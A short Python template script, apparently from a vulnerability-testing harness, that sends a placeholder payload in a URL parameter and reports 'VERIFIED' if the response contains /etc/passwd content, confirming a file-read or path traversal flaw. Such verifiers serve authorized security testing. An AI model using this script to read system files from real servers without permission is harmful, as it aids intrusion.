import urllib.parse
import urllib.request

target_url = "{{TARGET_URL}}"
param_name = "{{PARAM_NAME}}"
payload = "{{PAYLOAD}}"  

params = {param_name: payload}
url = target_url + "?" + urllib.parse.urlencode(params)

try:
    with urllib.request.urlopen(url) as response:
        body = response.read().decode("utf-8", errors="ignore")
        if "root:" in body:
            print(f"VERIFIED: Found /etc/passwd content")
            exit(0)
except Exception as e:
    print(f"ERROR: {e}")

print("NOT VERIFIED")
exit(1)
